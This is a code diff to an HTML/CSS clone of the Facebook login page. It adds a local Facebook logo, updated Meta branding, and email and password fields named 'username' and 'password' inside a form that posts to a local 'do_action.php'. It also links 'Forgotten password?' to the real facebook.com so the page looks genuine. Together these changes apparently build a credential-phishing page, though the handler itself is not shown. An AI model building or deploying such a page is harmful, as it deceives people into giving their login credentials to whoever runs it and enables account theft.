@@ -23,7 +23,7 @@ body {
 }
 
 main {
-    height: 70vh;
+    height: 90vh;
     width: 100vw;
     position: relative;
     margin: 0 auto;
@@ -49,6 +49,7 @@ footer {
 .col-logo {
     flex: 0 0 50%;
     text-align: left;
+
 }
 
 .col-form {
@@ -63,7 +64,7 @@ footer {
 .col-logo h2 {
     font: 26px;
     font-weight: 400;
-    padding: 0 30px;
+    padding: 0 px;
     line-height: 32px;
 }
 
@@ -198,20 +199,24 @@ footer small {
     <main>
         <div class="row">
             <div class="col-logo">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
-                <h2>Facebook helps you connect and share with the people in your life.</h2>
+                <img src="Facebook-Logo.png" alt="Logo">
+                <h2>Connect with friends and the world around you on Facebook.</h2>
             </div>
             <div class="col-form">
                 <div class="form-container">
-                    <input type="text" placeholder="Email or phone number">
-                    <input type="password" placeholder="Password">
+                    <div class="form">            
+                        <div class="login-form">
+                            <form action="do_action.php">
+                                <input name="username" type="text" id="username" placeholder="Email or phone number"></input><br />
+                                <input name="password" id="password" type="password" placeholder="Password"></input><br />
+                            </form>
                     <button class="btn-login">Login</button>
-                    <a href="#">Forgotten password?</a>
+                    <a href="https://www.facebook.com/">Forgotten password?</a>
                     <button class="btn-new">Create new Account</button>
                 </div>
-                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
             </div>
         </div>
+        <p><b>Create a Page</b> for a celebrity, brand or business.</p>
     </main>
     <footer>
         <div class="footer-contents">
@@ -270,7 +275,7 @@ footer small {
                 <li><a href="#">Instagram</a></li>
                 <li><a href="#">Local</a></li>
             </ol>
-            <small>Facebook © 2022</small>
+            <small>Meta © 2024</small>
         </div>
     </footer>
 </body>
